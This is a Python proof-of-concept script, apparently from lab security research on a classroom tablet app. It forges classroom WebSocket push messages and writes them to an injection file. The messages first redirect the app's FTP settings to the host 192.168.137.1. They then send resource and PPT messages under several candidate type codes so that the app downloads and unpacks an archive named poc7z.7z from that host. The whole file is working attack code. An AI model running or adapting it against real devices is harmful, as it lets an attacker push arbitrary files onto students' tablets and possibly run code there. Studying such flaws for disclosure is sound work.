# -*- coding: utf-8 -*-
"""inject_ppt_resource.py - 注入 PPT/资源推送(type=6) 触发 ResourceHelper 下载+解压。
依据 fake_classroom.py push_battery: ppt_bean + 多候选 type。
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"
URL = "http://%s/poc7z.7z" % OUR


def smsg(mtype, data, cid="179P00010", tag="canvas_tag", cmd=2):
    return json.dumps({
        "cId": cid, "cmd": cmd, "from": "10001", "gt": 0, "id": "1349658", "rt": 1,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
        "tags": ["RWYZKUIF"]}, ensure_ascii=False)


def inj(js, label, wait=9):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    # 1) 50001 先设 FTP 参数
    ftp = {"hostName": OUR, "port": 8080, "rootPath": "/mnt/sdcard/xhproxy",
           "downloadWaitTime": 3, "startLimitRate": 0.015}
    inj(smsg(50001, json.dumps(ftp, ensure_ascii=False), "179P00009", "default_tag", cmd=0),
        "50001 FTP参数", 8)

    files = {"url": URL, "fileUrl": URL, "downloadUrl": URL, "resourceUrl": URL,
             "path": URL, "sourceUrl": URL}
    bean = {"resourceId": "LAB_R1", "taskId": "LAB_T1", "subTaskId": "LAB_S1",
            "deskTopId": "", "status": 1, "resourceType": 1, "taskStatus": 1,
            "pptSource": 1, "name": "poc7z.7z", "type": ".7z", "size": 2685,
            "viewedIds": "", "viewedNum": 0, "originTotalNumber": 1}
    bean.update(files)

    # 2) 多候选 type 的 PPT/资源推送
    for mt, nm in ((6, "PPT资源(type=6)"), (4, "SYNC_PPT(type=4)"),
                   (5, "PPT_HAS_ENTRY(type=5)"), (20003, "任务下发(20003)"),
                   (20005, "资源下发(20005)")):
        inj(smsg(mt, json.dumps(bean, ensure_ascii=False)), nm, 9)
    # 3) 数组形式(部分解析器要 list)
    for mt, nm in ((6, "PPT资源数组(type=6)"), (20005, "资源数组(20005)")):
        inj(smsg(mt, json.dumps([bean], ensure_ascii=False)), nm, 9)
    print("done", flush=True)


if __name__ == "__main__":
    main()
